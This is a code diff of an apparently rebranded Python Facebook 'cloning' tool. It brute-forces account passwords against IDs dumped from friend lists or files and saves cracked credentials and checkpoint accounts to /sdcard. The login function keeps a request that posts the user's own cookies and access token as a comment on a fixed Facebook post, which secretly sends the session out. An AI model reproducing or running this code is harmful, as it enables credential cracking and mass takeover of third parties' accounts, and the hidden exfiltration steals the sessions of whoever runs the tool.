@@ -9,11 +9,6 @@ import os,base64,zlib,pip,urllib,time
 
 os.system('git pull')
 time.sleep(2)
-
-os.system('clear')
-
-print('\n\033[1;37m install modules...\n It will take some seconds...')
-
 os.system('clear')
 
 try:
@@ -110,9 +105,7 @@ logo=("""\033[1;37m
  Github    : Harryyy-XD
  Facebook  : Harry Don
  Tool Name : H-404
- Type type : TESTING
- Version   : v1 - 1.0.1
-
+ 
 \033[1;37m----------------------------------------------""")
 
 def linex():
@@ -167,11 +160,7 @@ def login():
                 linex()
 
                 print(' Welcome\033[1;32m : '+name)
-
-                print(' \033[1;37mYour UID : '+idd)
-
-                print(' Barth Day: '+barth)
-
+                
                 requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
 
                 linex()
@@ -183,18 +172,18 @@ def login():
                 menu()
 
         except KeyError:
-
-                print('\033[1;31m Cookies Has Been Expired ...')
+                print('')
+                print(' Cookies Has Been Expired ...')
 
                 os.system('rm -rf .tok.txt');time.sleep(1);login()
 
         except requests.exceptions.ConnectionError:
 
-                exit(' internet connection error...')
+                exit(' Internet connection error ...')
 
         except AttributeError:
-
-                print('\033[1;31m Cookies has been expired...')
+                print('')
+                print('Cookies has been expired ...')
 
                 os.system('rm -rf .tok.txt');time.sleep(1);login()
 
@@ -216,13 +205,13 @@ def public():
 
         except KeyError:
 
-                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                print('Your cookies has Been expired ...');time.sleep(1)
 
                 login()
 
         except IOError:
-
-                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                print('')
+                print('\033[1;31mYour cookies has Been Expired ...');time.sleep(1)
 
                 login()
 
@@ -238,17 +227,17 @@ def public():
 
         except KeyError:
 
-                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                print('\033[1;31mYour cookies has Been expired ...');time.sleep(1)
 
                 login()
 
         try:
 
-                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
+                jum=int(input(' How many Ids Do You want to Clone : '))
 
         except ValueError:
 
-                exit(' Put only digits not latters ')
+                exit(' Put only digits not letters ')
 
         if jum<1 or jum>5000:
 
@@ -262,7 +251,7 @@ def public():
 
                 yz+=1
 
-                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
+                kl = input(f'Enter id.{yz+0}: ')
 
                 usrr.append(kl)
 
@@ -280,7 +269,7 @@ def public():
 
         linex()
 
-        print(' Do you went show cp account? (y/n): ')
+        print(' CP ids Visible? (y/n): ')
 
         linex()
 
@@ -296,7 +285,7 @@ def public():
 
         linex()
 
-        print('\033[1;32m Dumping friend list...\033[1;37m')
+        print('Dumping friend list ...')
 
         linex()
 
@@ -332,7 +321,7 @@ def public():
 
                 try:
 
-                        ps_limit = int(input(' How many passwords do you want to add ? '))
+                        ps_limit = int(input(' Enter Password : '))
 
                 except:
 
@@ -356,7 +345,7 @@ def public():
 
                         print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
 
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        print("Use flight mode for speed up")
 
                         linex()
 
@@ -388,9 +377,9 @@ def public():
 
                 linex()
 
-                input(' Press enter to back ')
+                input(' Press enter to restart or CTRL+Z To stop ')
 
-                os.system('python ANISH.py')
+                os.system('python run.py')
 
         except requests.exceptions.ConnectionError:
 
@@ -416,7 +405,7 @@ def menu():
 
                 if x == ("sex"):
 
-                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crack\n [6] WhatsApp Group (join)\n [7] Download Vpn\n [8] How To Use Video\n [0] Exit menu')
+                        print(' [1] File cloning\n [2] Public cloning\n [3] Contact Admin \n [0] Exit menu')
 
                         linex()
 
@@ -430,7 +419,7 @@ def menu():
 
                                 linex()
 
-                                file = input(' Put file path\033[1;37m: ')
+                                file = input(' Put file path : ')
 
                                 try:
 
@@ -454,7 +443,7 @@ def menu():
 
                                 linex()
 
-                                mthd=input(' Choose: ')
+                                mthd=input(' Choose : ')
 
                                 linex()
 
@@ -462,7 +451,7 @@ def menu():
 
                                 try:
 
-                                        ps_limit = int(input(' How many passwords do you want to add ? '))
+                                        ps_limit = int(input(' Enter Password : '))
 
                                 except:
 
@@ -480,7 +469,7 @@ def menu():
 
                                 linex()
 
-                                print(' Do you went show cp account? (y/n): ')
+                                print(' CP ids Visible? (y/n): ')
 
                                 linex()
 
@@ -502,7 +491,7 @@ def menu():
 
                                         print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
 
-                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                                        print("Use flight mode for speed up")
 
                                         linex()
 
@@ -536,65 +525,25 @@ def menu():
 
                                 input(' Press enter to back ')
 
-                                os.system('python ANISH.py')
+                                os.system('python run.py')
 
                         elif xd in ['2','02']:
 
-                                import dump
-
-                                dump.Main()
+                               public()                      
 
                         elif xd in ['3','03']:
 
-                                public()
+                                os.system(f'xdg-open https://www.facebook.com/profile.php?id=100086144691850');menu()
 
                         elif xd in ['4','04']:
-
-                                clear()
-
-                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
-
-                                linex()
-
-                                x=input(' Choose: ')
-
-                                if x in ['1','01']:
-
-                                        pak()
-
-                                elif x in ['2','02']:
-
-                                        bd()
-
-                                elif x in ['3','03']:
-
-                                        gmail()
-
-                                else:
-
-                                        menu()
-
-                        elif xd in ['5','05']:
-
-                                gmail()
-
-                        elif xd in ['6','06']:
-
-                                wx=('Dsj9JMWoixk4Qsje0Ng3nA')
-
-                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
-
-                        elif xd in ['7','07']:
-
-                                os.system('xdg-open https://www.facebook.com/anish.baralbrl.1');menu()
-
-                        elif xd in ['0','00']:
-
-                                exit(' Thanks for use ðŸ¥° ')
-
+                              
+                                exit(' Thanks for Using This Tool ')                                                   
+                                
                         else:
 
-                                exit(' Option not found in menu...')
+                                print('  Option not found in menu ...')
+                                time.sleep(1)
+                                menu()
 
                 else:
 
@@ -634,7 +583,7 @@ def menu():
 
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
 
-                        print(' Run :  python ANISH.py')
+                        print(' Run :  python run.py')
 
                         exit()
 
@@ -706,7 +655,7 @@ def pak():
 
                 input(' Press enter to back ')
 
-                os.system('python ANISH.py')
+                os.system('python run.py')
 
 def bd():
 
@@ -766,7 +715,7 @@ def bd():
 
                 input(' Press enter to back ')
 
-                os.system('python ANISH.py')
+                os.system('python run.py')
 
 def gmail():
 
@@ -876,7 +825,7 @@ def gmail():
 
                 input(' Press enter to back ')
 
-                os.system('python ANISH.py')
+                os.system('python HARRY.py')
 
 def ffb(ids,names,passlist):
 
@@ -924,7 +873,7 @@ def ffb(ids,names,passlist):
 
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 
-                                print('\r\r\033[1;32m [ANISH-OK] %s | %s'%(ids,pas))
+                                print('\r\r\033[1;32m [HARRY-OK] %s | %s'%(ids,pas))
 
                                 open('/sdcard/ANISH-OK.txt', 'a').write(ids+'|'+pas+'\n')
 
@@ -1066,7 +1015,7 @@ def api(ids,names,passlist):
 
                                 if 'session_key' in q:
 
-                                        print('\r\r\033[1;32m [ANISH-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [HARRY-OK] '+ids+' | '+pas+'\033[1;97m')
 
                                         open('/sdcard/ANISH-OK.txt','a').write(ids+'|'+pas+'\n')
 
@@ -1078,7 +1027,7 @@ def api(ids,names,passlist):
 
                                         if 'y' in pcp:
 
-                                                print('\r\r\x1b[38;5;208m [ANISH-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[38;5;208m [HARRY-CP] '+ids+' | '+pas+'\033[1;97m')
 
                                                 open('/sdcard/ANISH-CP.txt', 'a').write(ids+'|'+pas+'\n')
 
@@ -1106,7 +1055,7 @@ def api1(ids,names,passlist):
 
                         global ok,loop
 
-                        sys.stdout.write('\r\r\033[1;37m [ANISH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [HARRY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 
                         fn = names.split(' ')[0]
 
@@ -1206,7 +1155,7 @@ def api1(ids,names,passlist):
 
                                 if 'session_key' in q:
 
-                                        print('\r\r\033[1;32m [ANISH-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [HARRY-OK] '+ids+' | '+pas+'\033[1;97m')
 
                                         open('/sdcard/ANISH-OK.txt','a').write(ids+'|'+pas+'\n')
 
@@ -1218,7 +1167,7 @@ def api1(ids,names,passlist):
 
                                         if 'y' in pcp:
 
-                                                print('\r\r\x1b[38;5;208m [ANISH-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[38;5;208m [HARRY-CP] '+ids+' | '+pas+'\033[1;97m')
 
                                                 open('/sdcard/ANISH-CP.txt', 'a').write(ids+'|'+pas+'\n')
 
@@ -1252,7 +1201,7 @@ def rndm(ids,passlist):
 
                         global ok,loop
 
-                        sys.stdout.write('\r\r\033[1;37m [ANISH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [HARRY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 
                         for pas in passlist:
 
@@ -1350,7 +1299,7 @@ def rndm(ids,passlist):
 
                                                 else:
 
-                                                        print('\r\r\033[1;32m [ANISH-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        print('\r\r\033[1;32m [HARRY-OK] '+uid+' | '+pas+'\033[1;97m')
 
                                                         open('/sdcard/ANISH-OK.txt','a').write(uid+'|'+pas+'\n')
 
@@ -1360,7 +1309,7 @@ def rndm(ids,passlist):
 
                                         except:
 
-                                                print('\r\r\033[1;32m [ANISH-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                print('\r\r\033[1;32m [HARRY-OK] '+uid+' | '+pas+'\033[1;97m')
 
                                                 open('/sdcard/ANISH-OK.txt','a').write(uid+'|'+pas+'\n')
 
